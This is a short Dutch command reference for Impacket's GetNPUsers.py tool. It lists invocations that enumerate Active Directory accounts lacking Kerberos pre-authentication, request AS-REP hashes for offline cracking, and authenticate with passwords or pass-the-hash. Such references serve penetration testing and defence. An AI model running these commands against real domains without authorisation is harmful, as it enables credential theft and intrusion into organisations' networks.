# getnpusers.py

Som Active Directory accounts op met Kerberos pre-authentication uitgeschakeld, die vatbaar kunnen zijn voor AS-REP roasting aanvallen. Onderdeel van de Impacket-suite.

## Usage
- `GetNPUsers.py domein/ -usersfile pad/naar/gebruikerslijst -dc-ip domain_controller_ip -no-pass` : som gebruikers op met Kerberos pre-authentication uitgeschakeld (standaard anonieme enumeration)
- `GetNPUsers.py domein/ -usersfile pad/naar/gebruikerslijst -dc-ip domain_controller_ip -no-pass -request` : voer AS-REP roasting uit en dump kraakbare hashes voor offline kraking
- `GetNPUsers.py domein/gebruikersnaam:wachtwoord -usersfile pad/naar/gebruikerslijst -dc-ip domain_controller_ip` : authenticeer met valide credentials (als anonieme binding is uitgeschakeld)
- `GetNPUsers.py domein/gebruikersnaam -hashes LM_Hash:NT_Hash -usersfile pad/naar/gebruikerslijst -dc-ip domain_controller_ip` : gebruik pass-the-hash authenticatie in plaats van een wachtwoord
- `GetNPUsers.py domein/ -usersfile pad/naar/gebruikerslijst -dc-ip domain_controller_ip -request >pad/naar/output.txt` : sla de output op in een bestand voor verdere analyse

## Links
- More information: https://github.com/fortra/impacket
